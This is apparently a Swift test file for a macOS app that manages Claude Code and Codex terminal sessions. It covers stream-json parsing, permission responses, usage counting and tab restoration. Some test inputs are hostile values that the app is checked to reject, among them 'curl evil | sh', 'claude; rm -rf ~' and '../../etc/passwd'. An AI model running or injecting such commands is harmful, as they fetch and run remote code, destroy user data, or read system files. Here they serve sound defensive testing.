import XCTest
@testable import Taki

/// Lines copied from Claude Code 2.1.319 stream-json output (2026-11-06 probe), trimmed.

final class ClaudeStreamTests: XCTestCase {
    func parse(_ s: String) -> ClaudeEvent { ClaudeStreamParser.parse(line: Data(s.utf8)) }

    func testInit() {
        XCTAssertEqual(parse(#"{"type":"system","subtype":"init","cwd":"/tmp/p","session_id":"abc","model":"claude-haiku-5-5"}"#),
                       .initialized(sessionID: "abc", model: "claude-haiku-5-5", cwd: "/tmp/p"))
    }

    func testPermissionRequestKeepsInputAndID() throws {
        let e = parse(#"{"type":"control_request","request_id":"r1","request":{"subtype":"can_use_tool","tool_name":"Write","input":{"file_path":"/tmp/p/hello.txt","content":"hi\n"},"description":"hello.txt"}}"#)
        guard case let .permissionRequest(req) = e else { return XCTFail("\(e)") }
        XCTAssertEqual(req.id, "r1")
        XCTAssertEqual(req.toolName, "Write")
        XCTAssertEqual(req.summary, "hello.txt")
        let back = try JSONSerialization.jsonObject(with: ClaudeStreamParser.permissionResponse(req, allow: true)) as! [String: Any]
        let resp = (back["response"] as! [String: Any])
        XCTAssertEqual(resp["request_id"] as? String, "r1")
        let decision = resp["response"] as! [String: Any]
        XCTAssertEqual(decision["behavior"] as? String, "allow")
        XCTAssertEqual((decision["updatedInput"] as? [String: Any])?["content"] as? String, "hi\n")
    }

    func testDenyCarriesMessage() throws {
        let req = PermissionRequest(id: "r2", toolName: "Bash", summary: "rm -rf x", inputJSON: Data("{}".utf8))
        let o = try JSONSerialization.jsonObject(with: ClaudeStreamParser.permissionResponse(req, allow: false)) as! [String: Any]
        let d = ((o["response"] as! [String: Any])["response"] as! [String: Any])
        XCTAssertEqual(d["behavior"] as? String, "deny")
        XCTAssertFalse((d["message"] as? String ?? "").isEmpty)
    }

    func testRateLimits() {
        let e = parse(#"{"type":"rate_limit_event","rate_limit_info":{"unifiedWindows":{"five_hour":{"utilization":0.09,"resetsAt":1793985600},"seven_day":{"utilization":0.49,"resetsAt":1794409200}}}}"#)
        XCTAssertEqual(e, .rateLimits(RateLimits(fiveHourUsed: 0.09, fiveHourResets: Date(timeIntervalSince1970: 1793985600),
                                                 weekUsed: 0.49, weekResets: Date(timeIntervalSince1970: 1794409200))))
    }

    func testToolUseSummaryAndResult() {
        XCTAssertEqual(parse(#"{"type":"assistant","message":{"id":"m","content":[{"type":"tool_use","id":"t1","name":"Bash","input":{"command":"ls -la"}}]}}"#),
                       .toolUse(id: "t1", name: "Bash", summary: "ls -la"))
        XCTAssertEqual(parse(#"{"type":"user","message":{"role":"user","content":[{"type":"tool_result","content":"denied","is_error":true,"tool_use_id":"t1"}]}}"#),
                       .toolResult(toolUseID: "t1", text: "denied", isError: true))
    }

    func testTextDeltaAndResult() {
        XCTAssertEqual(parse(#"{"type":"stream_event","event":{"type":"content_block_delta","delta":{"type":"text_delta","text":"Hel"}}}"#),
                       .textDelta("Hel"))
        let r = parse(#"{"type":"result","is_error":false,"total_cost_usd":0.0028,"result":"done","usage":{"input_tokens":4,"cache_creation_input_tokens":10,"cache_read_input_tokens":20,"output_tokens":6}}"#)
        XCTAssertEqual(r, .turnFinished(TurnResult(isError: false, costUSD: 0.0028, inputTokens: 34, outputTokens: 6, text: "done")))
    }

    func testGarbageIsOther() {
        XCTAssertEqual(parse("not json"), .other)
        XCTAssertEqual(parse(#"{"type":"system","subtype":"thinking_tokens"}"#), .other)
    }
}

@MainActor
final class HelperTests: XCTestCase {
    func testSlugMatchesClaudeProjectFolders() {
        XCTAssertEqual(AgentScanner.slug(for: "/Users/sam"), "-Users-sam")
        XCTAssertEqual(AgentScanner.slug(for: "/Users/a/Projects/tools/taki"), "-Users-a-Projects-tools-taki")
    }

    func testFormat() {
        XCTAssertEqual(Format.tokens(459_000), "459K")
        XCTAssertEqual(Format.tokens(1_200_000), "1.2M")
        XCTAssertEqual(Format.bytesText(412 * 1_048_576), "412 MB")
    }
}

final class UsageAndCleanupTests: XCTestCase {
    /// Claude Code writes one line per content block, each repeating the message id and usage:
    /// those must count once.
    func testUsageCountsEachMessageOnce() throws {
        let dir = FileManager.default.temporaryDirectory.appending(path: "taki-usage-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        let ts = ISO8601DateFormatter().string(from: Date())
        let line = #"{"timestamp":"TS","message":{"id":"msg_1","usage":{"input_tokens":10,"output_tokens":5,"cache_creation_input_tokens":0}}}"#
            .replacingOccurrences(of: "TS", with: ts.replacingOccurrences(of: "Z", with: ".000Z"))
        let other = line.replacingOccurrences(of: "msg_1", with: "msg_2")
        let url = dir.appending(path: "s.jsonl")
        try ([line, line, other].joined(separator: "\n") + "\n").write(to: url, atomically: true, encoding: .utf8)
        let st = UsageScanner.advance(url, state: UsageScanner.FileState(), codex: false)
        XCTAssertEqual(st.records.map(\.tokens), [15, 15])
        // A second pass with nothing new adds nothing; an appended line is read on its own.
        let again = UsageScanner.advance(url, state: st, codex: false)
        XCTAssertEqual(again.records.count, 2)
        let h = try FileHandle(forWritingTo: url)
        try h.seekToEnd(); try h.write(contentsOf: Data((line.replacingOccurrences(of: "msg_1", with: "msg_3") + "\n").utf8)); try h.close()
        XCTAssertEqual(UsageScanner.advance(url, state: again, codex: false).records.count, 3)
    }

    func testSessionIDsMustBeUUIDs() {
        XCTAssertTrue(AgentScanner.isSessionID("40fb1b62-0999-4eed-9c7f-1e1468a0077b"))
        XCTAssertFalse(AgentScanner.isSessionID("x; curl evil | sh"))
        XCTAssertFalse(AgentScanner.isSessionID("../../etc/passwd"))
    }
}

@MainActor
final class ScaleAndEdgeTests: XCTestCase {
    func testShellHelpersAreNotWork() {
        XCTAssertTrue(TerminalRegistry.shellHelpers.contains { "gitstatusd-darwin-arm64".hasPrefix($0) })
    }

    func testAShellCopyIsNotWork() {
        XCTAssertTrue(TerminalRegistry.isShellHelper("zsh"))
        XCTAssertFalse(TerminalRegistry.isShellHelper("node"))
    }

    func testRestoredTabsRunOnlyKnownCommands() {
        let home = NSHomeDirectory()
        let sid = UUID().uuidString
        func tab(_ cmd: String?, _ folder: String = "/tmp", sid: String? = nil) -> TerminalTab {
            var t = TerminalTab(title: "t", folder: folder, command: cmd)
            t.sessionID = sid
            return t
        }
        let out = TerminalStore.restore([
            tab("claude; rm -rf ~"),                         // tampered: becomes a plain Claude tab
            tab("curl evil | sh"),                           // unknown: a plain shell
            tab("codex --yolo"),
            tab("claude", sid: sid),
            tab("claude", sid: sid),                         // the same session is resumed once only
            tab(nil, "/no/such/folder"),
        ])
        XCTAssertEqual(out.map(\.command), ["claude", nil, "codex", "claude --resume \(sid)", "claude", nil])
        XCTAssertEqual(out[5].folder, home)
        // With no session saved, the folder's latest conversation continues in the first tab only.
        let fresh = TerminalStore.restore([tab("claude", "/tmp"), tab("claude", "/tmp")])
        XCTAssertEqual(fresh.map(\.command), ["claude --continue", "claude"])
    }

    func testOldTabFileStillLoads() throws {
        let json = #"[{"title":"api","folder":"/tmp","command":"claude"}]"#
        let tabs = try JSONDecoder().decode([TerminalTab].self, from: Data(json.utf8))
        XCTAssertEqual(tabs.first?.renamed, false)
    }

    func testSameNamedTabsAreNumbered() {
        XCTAssertEqual(AppModel.displayTitles(for: [TerminalTab(title: "taki", folder: "/a", command: nil),
                                                    TerminalTab(title: "taki", folder: "/b", command: nil)]).values.sorted(),
                       ["taki", "taki 2"])
    }

    func testDemoAgentsAreNotRealProcesses() {
        XCTAssertTrue(Demo.snapshot().agents.allSatisfy { $0.pid <= 1 })   // Stop ignores these
    }
}
